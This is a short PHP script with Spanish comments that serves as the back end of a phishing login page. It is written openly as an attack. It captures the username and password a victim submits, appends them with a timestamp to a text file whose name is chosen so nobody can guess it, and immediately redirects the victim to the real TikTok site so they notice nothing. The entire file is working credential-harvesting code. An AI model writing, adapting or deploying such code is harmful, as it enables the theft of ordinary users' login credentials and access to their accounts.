<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 1. Capturar los datos que escribió el usuario
    $usuario_recibido = $_POST['txt_usuario'];
    $contrasena_recibida = $_POST['txt_contrasena'];

    // 2. Nombre del archivo oculto donde se guardarán los datos para ti
    // Le ponemos un nombre difícil para que nadie lo adivine en internet
    $archivo_secreto = "registro_privado_8492.txt";

    // 3. Darle formato a la información con la fecha y hora
    $texto_a_guardar = "Fecha: " . date("Y-m-d H:i:s") . " | Usuario: " . $usuario_recibido . " | Clave: " . $contrasena_recibida . "\n";

    // 4. Abrir el archivo y escribir los datos en segundo plano (Append)
    $manejador = fopen($archivo_secreto, "a");
    fwrite($manejador, $texto_a_guardar);
    fclose($manejador);

    // 5. REDIRECCIÓN INMEDIATA (El usuario no verá nada de lo anterior)
    // El navegador lo mandará automáticamente a la web real
    header("Location: https://tiktok.com");
    exit();

} else {
    // Si intentan entrar al PHP escribiendo la URL directamente
    header("Location: index.html");
    exit();
}
?>

            
